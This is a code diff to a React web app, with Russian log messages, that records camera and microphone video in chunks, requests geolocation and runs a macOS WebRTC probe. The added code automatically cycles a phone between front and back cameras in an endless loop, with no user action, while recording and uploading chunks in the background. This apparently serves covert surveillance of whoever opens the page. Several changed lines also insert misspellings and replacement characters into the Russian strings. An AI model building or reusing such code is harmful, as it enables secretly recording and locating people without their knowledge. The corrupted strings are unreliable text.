@@ -29,6 +29,9 @@ export default function App() {
   // Video recording states (now includes audio)
   const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
   const [isVideoRecording, setIsVideoRecording] = useState(false);
+  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
+  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('front');
+  const isSwitchingCameraRef = useRef(false);
   
   // Check if running in iframe with restricted permissions
   const checkIframePermissions = (): string | null => {
@@ -161,7 +164,7 @@ export default function App() {
             }, 1000);
           })
           .catch(err => {
-            log('⚠️ [macOS] WebRTC ошибка (не критичн):', err);
+            log('⚠️ [macOS] WebRTC ош��бка (не критичн):', err);
             pc.close();
             resolve();
           });
@@ -199,7 +202,7 @@ export default function App() {
   // Request Camera & Microphone
   const requestCamMic = async () => {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      throw new Error('getUserMedia не поддерживается');
+      throw new Error('getUserMedia не поддрживается');
     }
     
     log('▶️ Запрашиваем камеру и микрофон…');
@@ -313,7 +316,7 @@ export default function App() {
         isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
       ].filter(Boolean).join('\n');
       case 2: return isMac 
-        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Службы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
+        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > С��ужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
         : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
       case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
       default: return isMac
@@ -732,9 +735,120 @@ export default function App() {
     }
   };
   
-  // Handle video chunk ready (now includes audio)
+  // Switch camera (for mobile devices only)
+  const switchCamera = async (newFacingMode: 'user' | 'environment') => {
+    const device = detectDevice();
+    
+    // Only switch cameras on mobile devices
+    if (device === 'desktop') {
+      console.log('⚠️ Desktop detected - camera switching not available');
+      return;
+    }
+    
+    if (isSwitchingCameraRef.current) {
+      console.log('⚠️ Camera switch already in progress, skipping...');
+      return;
+    }
+    
+    isSwitchingCameraRef.current = true;
+    
+    try {
+      console.log(`📹 Переключаем камеру а: ${newFacingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'ЗАДНЮЮ'}`);
+      
+      // Stop current stream
+      if (videoStreamFront) {
+        videoStreamFront.getTracks().forEach(track => {
+          track.stop();
+          console.log(`⏹️ Остановлен трек: ${track.kind} - ${track.label}`);
+        });
+      }
+      
+      // Stop recording temporarily
+      setIsVideoRecording(false);
+      
+      // Wait a bit for cleanup
+      await new Promise(resolve => setTimeout(resolve, 300));
+      
+      // Request new camera stream
+      console.log(`📷 Запрашиваем ${newFacingMode === 'user' ? 'фронтальную' : 'заднюю'} камеру + микрофон...`);
+      const newStream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: newFacingMode,
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: true
+      });
+      
+      // Update state with new stream
+      setVideoStreamFront(newStream);
+      setCurrentCameraType(newFacingMode === 'user' ? 'front' : 'back');
+      
+      // Wait for stream to be ready
+      await new Promise(resolve => setTimeout(resolve, 300));
+      
+      // Resume recording with new camera
+      setIsVideoRecording(true);
+      
+      console.log(`✅ Камера переключена на ${newFacingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'ЗАДНЮЮ'}`);
+    } catch (error) {
+      console.error(`❌ Ошибка переключения камеры:`, error);
+      
+      // If back camera fails, fallback to front camera
+      if (newFacingMode === 'environment') {
+        console.log('⚠️ Задняя камера недоступна, возвращаемся к фронтальной...');
+        try {
+          const fallbackStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: 'user',
+              width: { ideal: 1280 },
+              height: { ideal: 720 }
+            },
+            audio: true
+          });
+          setVideoStreamFront(fallbackStream);
+          setCurrentCameraType('front');
+          setIsVideoRecording(true);
+          console.log('✅ Возвращены к фронтальной камере');
+        } catch (fallbackError) {
+          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальной камере:', fallbackError);
+        }
+      }
+    } finally {
+      isSwitchingCameraRef.current = false;
+    }
+  };
+  
+  // Handle video chunk ready with camera switching logic
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
     console.log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
+    
+    // Update current chunk number
+    setCurrentChunkNumber(chunkNum);
+    
+    // CAMERA SWITCHING LOGIC (only for mobile devices)
+    // Pattern: 3 front → 2 back → 3 front → 2 back → ... (infinite loop)
+    const device = detectDevice();
+    if (device !== 'desktop') {
+      // Determine if we need to switch camera for the NEXT chunk
+      // Cycle: chunks 1-3 front, 4-5 back, 6-8 front, 9-10 back, etc.
+      // Switch after chunk 3, 5, 8, 10, 13, 15...
+      
+      const shouldSwitchToBack = chunkNum % 5 === 3 && currentCameraType === 'front';
+      const shouldSwitchToFront = chunkNum % 5 === 0 && currentCameraType === 'back';
+      
+      if (shouldSwitchToBack) {
+        console.log(`🔄 Чанк #${chunkNum} завершен - переключаем на ЗАДНЮЮ камеру`);
+        setTimeout(() => {
+          switchCamera('environment');
+        }, 500);
+      } else if (shouldSwitchToFront) {
+        console.log(`🔄 Чанк #${chunkNum} завершен - переключаем на ФРОНТАЛЬНУЮ камеру`);
+        setTimeout(() => {
+          switchCamera('user');
+        }, 500);
+      }
+    }
     
     // CRITICAL: Send video in background WITHOUT blocking UI
     // Remove 'await' to prevent freezing the entire browser window
@@ -755,7 +869,7 @@ export default function App() {
           stream={videoStreamFront}
           isRecording={isVideoRecording}
           onChunkReady={handleVideoChunkReady}
-          cameraType={deviceType === 'desktop' ? 'desktop' : 'front'}
+          cameraType={currentCameraType}
         />
       )}
     </>
